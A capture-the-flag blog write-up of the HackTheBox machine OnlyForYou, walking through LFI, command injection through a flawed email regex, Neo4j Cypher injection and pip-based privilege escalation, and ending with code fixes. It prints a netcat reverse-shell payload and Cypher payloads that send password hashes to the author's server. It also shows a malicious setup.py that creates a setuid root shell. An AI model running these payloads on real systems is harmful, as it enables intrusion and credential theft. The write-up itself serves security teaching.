---
layout: post
title: HTB OnlyForYou
cover-img: /assets/covers/OnlyForYou.png
excerpt_separator: <!--more-->
tags: [HTB, HackTheBox, linux, LFI, python, regex]
comments: true
---
OnlyForYou is a medium-difficulty machine released on HackTheBox.
<!--more-->

## Recon

Nmap shows SSH and HTTP being open:
```
❯ sudo nmap 10.10.11.210 -p- -sV -oN onlyforyou.nmap                                                                                                                                            21:03:50
[sudo] password for jan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-22 21:04 CEST
Stats: 0:00:44 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 60.87% done; ETC: 21:05 (0:00:28 remaining)
Nmap scan report for 10.10.11.210
Host is up (0.049s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.10 seconds
```

## only4you.htb
The website redirects to http://only4you.htb domain. Once i add this domain to my hosts file, I can access the website. It seems to be offering a web development service:

![Web-Index](/assets/screenshots/htb-only4you/web-index.png)

At the bottom of the page, there is a contact form. I try to fill it with test values:

![Contact-us](/assets/screenshots/htb-only4you/contact-form.png)

But there seems to be no response.

Looking through the site, there is a mention of a subdomain, that contains a beta product:

![Beta](/assets/screenshots/htb-only4you/beta.png)

It links to http://beta.only4you.htb. I am going to run `ffuf` to verify it's existence, and to see if there additional subdomains. It confirms the `beta` subdomain, but finds no additional ones:
```
❯ ffuf -H "Host: FUZZ.only4you.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://only4you.htb -mc all -fs 178                                               21:24:53

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://only4you.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.only4you.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 178
________________________________________________

[Status: 200, Size: 2191, Words: 370, Lines: 52, Duration: 271ms]
    * FUZZ: beta

:: Progress: [100000/100000] :: Job [1/1] :: 512 req/sec :: Duration: [0:04:43] :: Errors: 0 :
```

## beta.only4you.htb

Looking at the beta product, it offers it's source code for download:

![Beta-index](/assets/screenshots/htb-only4you/beta-index.png)

At the top right, there are two links, `resize` and `convert`. Both of are picture editing tools:

![Resize](/assets/screenshots/htb-only4you/resize.png)

Lets have a look at the source code. It is a Flask application. It defines routes for */resize* and */convert* as can be seen on the website. There is an interesting route, */download*:
```python
@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image) 
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)
```
It seems to filter out attemps at LFI (Local File Inclusion) by exiting if the `image` parameter contains '..' or '../'. It then checks if the filename is an absolute path (meaning it starts with an '/') and if it isn't, is prepends the path to 'LIST_FOLDER' to it. It then sends the file. This seems like quite an obvious LFI, i just need to provide an absoulte path to the file, as there is nothing preventing me from doing that. I can try out in BurpSuite and see that it works:

![Buro-LFI](/assets/screenshots/htb-only4you/burp_lfi.png)

The output of `/etc/passwd` shows that there are 2 users otehr than root **john** and **dev**. I tried accessing SSH keys in their home directory, but no luck. There is also an **www-data** user, and it is likely this website process is running as this user. I tried accessing the source code of the website at */var/www/html* and */var/www/beta*, but no luck. 

Where to go from there? I decided to do a bruteforce scan of the */proc* directory. I am going to send the LFI to */proc/PID/cmdline*, changing the PID, to get an idea of what processes are running and if they leak any infrormation. However, this didn't show anything useful.

From the response headers, I know that website is running on an nginx server. I can try to locate the source code of the website by accessing */etc/nginx/sites-enabled/default*, which is the default location for storing nginx virtual host configuration. Using this file location, i get the config:

![Nginx-config](/assets/screenshots/htb-only4you/burp_nginx.png)

I already ahve the source for **beta.only4you.htb**, but i can take a look at the main website. Since beta was written in python, maybe the main site is too. I can try to access the *app.py* file, and i get the source code:

![Burp-app.py](/assets/screenshots/htb-only4you/burp_app.png)

The code is very short, as the site is mostly static. I can see the code that handles sending the contact form. When a POST request is sent to */*, it extracts the parametrs sent in the request and then calls a *sendmessage()* function with these parametrs. This function is imported from form:
```python
from form import sendmessage
```

Form doesn't seem like a standart python library. I can try to access *form.py* file, and i get the source code:
```python

import smtplib, re
from email.message import EmailMessage
from subprocess import PIPE, run
import ipaddress

def issecure(email, ip):
	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
		return 0
	else:
		domain = email.split("@", 1)[1]
		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
		output = result.stdout.decode('utf-8')
<<<MORE PYTHON CODE>>>

def sendmessage(email, subject, message, ip):
	status = issecure(email, ip)
	if status == 2:
		msg = EmailMessage()
		msg['From'] = f'{email}'
		msg['To'] = 'info@only4you.htb'
		msg['Subject'] = f'{subject}'
		msg['Message'] = f'{message}'

		smtp = smtplib.SMTP(host='localhost', port=25)
		smtp.send_message(msg)
		smtp.quit()
		return status
	elif status == 1:
		return status
	else:
		return status
```
## Foothold

The code is quite long but i cut out the irrelevant lines. When the *sendmessage()* function is called, it first checks if the email is secure using the *issecure()* function and then sends an email to *info@only4you.htb* using python libraries. Looking at the *issecure()* function, it first checks if the provided email matches a regular expression:
```python
if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
	return 0
```
And if it does, it sends a DNS TXT query to the domain extracted from email:
```python
domain = email.split("@", 1)[1]
result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
```

The code calls a *subprocess.run()* function on user input, which could be dangerous. But before i think about crafting a payload, i need to bypass the regual expression check. This part of expression seems weird:
```re
(\.[A-Z|a-z]{2,})
```

This matches a string that starts with `.` literal followed by two or more letters. This is supposed to match a country code at the end of an email address. However, there is anotehr character, a pipe literal `|`. Interestingly, the since the pipe character is inside a list, it will act as a literal `|` and not as OR operator, as the developer probably intended. And since the part of the email after `@` is executed inside a bash command i think i can abuse it with following payload to get RCE:
```
test@test.test|<command here> 
```

To test this out, I am going to start a netcat listener on port 9000, and send a reverse shell payload:
```
test@test.test|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.45 9000 >/tmp/f
```

I will URL encode this paylaod in Burp, and when i send it, i get a 502 error:

![Burp-rev](/assets/screenshots/htb-only4you/burp_rev.png)

But i got a callback on my listener, and i am now `www-data` user:
```
❯ nc -lvnp 9000                                                                                                                                                                         09:52:43
listening on [any] 9000 ...
connect to [10.10.14.45] from (UNKNOWN) [10.10.11.210] 38350
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## User

While looking at the open ports, there are a few non-standart ones:
```
$ ss -tnlp
State    Recv-Q   Send-Q          Local Address:Port        Peer Address:Port   Process                                                                         
LISTEN   0        151                 127.0.0.1:3306             0.0.0.0:*                                                                                      
LISTEN   0        511                   0.0.0.0:80               0.0.0.0:*       users:(("nginx",pid=1038,fd=6),("nginx",pid=1037,fd=6))                        
LISTEN   0        4096            127.0.0.53%lo:53               0.0.0.0:*                                                                                      
LISTEN   0        128                   0.0.0.0:22               0.0.0.0:*                                                                                      
LISTEN   0        4096                127.0.0.1:3000             0.0.0.0:*                                                                                      
LISTEN   0        2048                127.0.0.1:8001             0.0.0.0:*                                                                                      
LISTEN   0        70                  127.0.0.1:33060            0.0.0.0:*                                                                                      
LISTEN   0        50         [::ffff:127.0.0.1]:7474                   *:*                                                                                      
LISTEN   0        128                      [::]:22                  [::]:*                                                                                      
LISTEN   0        4096       [::ffff:127.0.0.1]:7687                   *:* 
```
Port 3306 and 33060 are MySQL, 7474 is Neo4j and 7687 is Bolt database. Ports 3000 and 8001 both seem to be different websites.

Interacting with websites over command line is very impractical. I am going to use [chisel](https://github.com/jpillora/chisel) to create a tunnel forwarding ports from the remote machine to my localhost.

First i will look at port 3000. On my local machine run chisel seerver:
```
❯ ./chisel server -p 8000 --reverse                                                                                                                                                             10:28:07
2023/04/24 10:28:09 server: Reverse tunnelling enabled
2023/04/24 10:28:09 server: Fingerprint c8j4Bjx3eENa7StOyIPsklD+NfPcro/CIz70JrIQNU8=
2023/04/24 10:28:09 server: Listening on http://0.0.0.0:8000
```
And on the remote machine run chisel client:
```
./chisel client 10.10.14.45:8000 R:3000:127.0.0.1:3000
```
Now i can access the website on http://127.0.0.1:3000. It is a [Gogs](https://gogs.io/) instance:

![Gogs](/assets/screenshots/htb-only4you/gogs.png)

I can see there are two users, `john` and `administrator`:

![Gogs-users](/assets/screenshots/htb-only4you/gogs_users.png)

But they don't have any public repositories, and i can't login to their account, so for now i can't do much.

Next, I am going to look at port 8001. Use the same process with chisel, and i can see a login page on http://127.0.0.1:8001:

![Login](/assets/screenshots/htb-only4you/login.png)

I tried a basic credentials of admin:admin and it works, and i am logged in:

![Dashboard](/assets/screenshots/htb-only4you/dashboard.png)

There is a search functionality for searching records of employees:

![Search](/assets/screenshots/htb-only4you/search.png)

To test out for SQL injection, I am going to send a `'` chracter in BurpSuite, and see that the page returns a 500 error:

![500](/assets/screenshots/htb-only4you/500.png)

This is a prety good indicator that it is vulnerable to SQLi.

Now since there are acutally 2 databases running on the machine (Neo4J and MySQL), the question is which database this application is using. Initially i thought that it is using MySQL, but after failing to make a payload work i decided to try Neo4j injections. There is a [HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j) page that provides some example payloads. 

It uses `LOAD CSV FROM` function exfiltrate the data. To see if that works, i will create a simple payload:
```
search=' OR 1=1 LOAD CSV FROM 'http://10.10.14.210:8888' as _l RETURN 1 // 
```

This payload should make a request to my webserver trying to read a CSV from it. When i start the server, I can see this payload works:
```
❯ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.11.210 - - [24/Apr/2023 23:11:03] "GET / HTTP/1.1" 200 -
10.10.11.210 - - [24/Apr/2023 23:11:03] "GET / HTTP/1.1" 200 -
10.10.11.210 - - [24/Apr/2023 23:11:03] "GET / HTTP/1.1" 200 -
10.10.11.210 - - [24/Apr/2023 23:11:04] "GET / HTTP/1.1" 200 -
10.10.11.210 - - [24/Apr/2023 23:11:04] "GET / HTTP/1.1" 200 -
```

Now before continuing, I would like to explain how Neo4j works, as it is necessary to udnerstand this before continuing. Neo4j stores its data in nodes. Nodes can be tagged with label, which is used to identify them. Nodes then hold any number of key-value pairs. To compare this to relational databases, you can think of a node as a table, key as a column and value is a row. The image ilustrates this concept:

![aa](/assets/screenshots/htb-only4you/sample-cypher.svg)

So, the first thing I need is to get labels stored in the databse. There is a function `db.labels()` taht does exactly that. So, to get the labels, i will use the following payload:
```
search=' OR 1=1 CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.210:8888/?label=' + label as _l RETURN 1 // 
```

This gets the label from `db.labels()` and then makes a request to my webserver, exfiltrating the label in URL as query parametr. It is importnat to URL encode the payload because it contains `+` character, which is bad in a form data. After running the payload, i get the following callbacks:
```
10.10.11.210 - - [24/Apr/2023 23:19:46] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [24/Apr/2023 23:19:46] "GET /?label=employee HTTP/1.1" 200 -
<...>
```
There are 2 labels, *user* and *employee*. Naturally I am more interested in the user node. Now i need to find out the keys and their values. The syntax is but more comples, but here is the payload:
```
search=' OR 1=1 MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.210:8888/?' + p +'=' +toString(f[p]) as _l RETURN 1 //
```

The *MATCH* function is similar to *SELECT* and it is going to find all user nodes and store them in the `f` variable. Keys are stored in the `p` variable. Running this payload, these are the requests on my webserver:
```
10.10.11.210 - - [24/Apr/2023 23:25:58] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [24/Apr/2023 23:25:58] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [24/Apr/2023 23:25:58] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [24/Apr/2023 23:25:58] "GET /?username=john HTTP/1.1" 200 -
```

2 usernames *john* and *admin*, and 2 hashes. Using [crackstation](https://crackstation.net/), *8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918* cracks to *admin*, which is password of admin, as I already know. However, *a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6* cracks to a new password:

![Password](/assets/screenshots/htb-only4you/password.png)

This could be john's password. I can try to SSH login with credentials john:ThisIs4You, and it works! I can also get the user flag:
```
$ id
uid=1000(john) gid=1000(john) groups=1000(john)
$ cat user.txt 
fb1945bf4e<...>
```

## Privileage escalation
John can run a command as root:
```
$ sudo -l
Matching Defaults entries for john on only4you:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
```

This command is going to use pip to download a tar archive from http://127.0.0.1:3000. From earlier i remember that Gogs instance was running on this port. I can reestabilish the tunnel and try to login as john with the newly aquired password. It  works, and john has one private repository, *Test*:

![Git-test](/assets/screenshots/htb-only4you/git_test.png)

I can upload files to this repositroy, but is the original sudo command even vulnerable to an attack?

It turns out it might be. According to [this](https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/) blog post, `pip download` may allow attacker to run arbitrary code, assuming attacker controls the downloaded package. It achieves this by creating a `setup.py` file, and inside it, a `cmdclass` dictionary. It provides a proof of concept of the attack. I will modify it to grant bash the setuid bit:
```python
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import os

def RunCommand():
    os.system("cp /bin/bash /tmp/a")
    os.system("chmod u+s /tmp/a")

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "pwned",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)
```
After that, i need to install and  run the `build` module of python, to create the tar archive. After running the command:
```
python3 -m build
```
It creates the tar archive in the *dist/* directory:
```
 ❯ ls dist
pwned-0.0.1-py3-none-any.whl  pwned-0.0.1.tar.gz
```

Now i need to upload the tar archive to Gogs. I can't use the Test repository, since it's private and the way the sudo command is run doesn't allow for authorization. So, instead i am going to create a public repository:

![Git-pwned](/assets/screenshots/htb-only4you/git_pwned.png)


Now i will create an empty git repo in the *dist/* directory, and upload the malicious tar archive:
```
❯ cd dist
❯ git init
hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint: 
hint:   git config --global init.defaultBranch <name>
hint: 
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint: 
hint:   git branch -m <name>
Initialized empty Git repository in /home/jan/Blog/HTB/OnlyForYou/privesc/dist/.git/

❯ git remote add origin http://127.0.0.1:3000/john/pwned.git
❯ git add .
❯ git commit -m "pwned"
[master (root-commit) 3b726c5] pwned
 2 files changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 pwned-0.0.1-py3-none-any.whl
 create mode 100644 pwned-0.0.1.tar.gz

❯ git push -u origin master
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 3 threads
Compressing objects: 100% (4/4), done.
Writing objects: 100% (4/4), 1.62 KiB | 1.62 MiB/s, done.
Total 4 (delta 0), reused 0 (delta 0), pack-reused 0
Username for 'http://127.0.0.1:3000': john
Password for 'http://john@127.0.0.1:3000': 
To http://127.0.0.1:3000/john/pwned.git
 * [new branch]      master -> master
branch 'master' set up to track 'origin/master'.
```

Now all i need to do is run the comand as root, and prove the url to the tar archive:
```
sudo pip3 download http://127.0.0.1:3000/john/pwned/raw/master/pwned-0.0.1.tar.gz
Collecting http://127.0.0.1:3000/john/pwned/raw/master/pwned-0.0.1.tar.gz
  Downloading http://127.0.0.1:3000/john/pwned/raw/master/pwned-0.0.1.tar.gz (839 bytes)
  Saved ./pwned-0.0.1.tar.gz
Successfully downloaded pwned
```
Now there should be a copy of bash with setuid bit:
```
$ ls -la /tmp/a
-rwsr-xr-x 1 root root 1183448 Apr 25 08:04 /tmp/a
```
And there it is! I can use this to get a root shell, and get the flag:
```
$ /tmp/a -p
a-5.0# id
uid=1000(john) gid=1000(john) euid=0(root) groups=1000(john)
a-5.0# cat /root/root.txt 
42b8abe7<...>
```

## Fixing the vulnerabilites

### LFI
The intial vulnerability was the LFI  on the *beta.only4you.htb* domain. This was the vulnerable code:
```python
@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image) 
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)
```
It first checks if filename contains characters typical for directory traversal ('..' and '../'). After that it checks if the filename is absoulte path, and if it is not it prepends the path to `LIST_FOLDER` to it and checks if the filename exists. If it does exist, it then sends a reposne containgin this file. There is no reason to allow users to specify absolute paths in the request, so the fix is quite simple:
```python
if not os.path.isabs(filename):
    filename = os.path.join(app.config['LIST_FOLDER'], filename)
else:
    flash('Hacking detected!', 'danger')
    return redirect('/list')
```

### RCE

Next step in the attack was the vulnerable contact form, that allowed Remote Code Execution. The first flaw was in the regular expression:
```python
if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
	return 0
```
The problem is in this part:
```re
[A-Z|a-z]{2,}
```
The square brackets `[]` create a list that will match any character present in it. There is no need for the `|` operator, and written like this, it actually allows literal `|` chracter in the domain name, which is used later in the exploit. Supringly, when googling for *'python re validate email address'* some of the top results contasin the same flaw, like [here](https://www.geeksforgeeks.org/check-if-email-address-valid-or-not-in-python/), and [here](https://stackabuse.com/python-validate-email-address-with-regular-expressions-regex/). The fix is again simple, remove the `|` character:
```re
[A-Za-z]{2,}
```
The above regular expression allows `|` character in the domain name, but that by itself is not vulnerable. The bigger issue is that the code then uses user provided input to run a shell command:
```python
domain = email.split("@", 1)[1]
result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
```
There is simply no need to do this. If you need to execute a DNS query, use library, for example [dnspython](https://www.dnspython.org/).

### Neo4j injection

Now that i am root on the machine, i can access the vulnerable code that allowed for Neo4j injection. Here it is:
```bash
results = tx.run("MATCH (n:employee) "
                "WHERE n.name contains '"+ name +"' " 
                "RETURN n.name AS name, n.salary AS salary, n.country AS country, n.city AS city")
```
This concats the `name` variable to a string used inside `tx.run()` function. According to [neo4j](https://neo4j.com/developer/kb/protecting-against-cypher-injection/) this is wrong way to do it, and instead query paramaterization should be used. Fixed query looks like this:
```bash
results = tx.run("MATCH (n:employee) "
                "WHERE n.name contains $name" 
                "RETURN n.name AS name, n.salary AS salary, n.country AS country, n.city AS city", name=name)

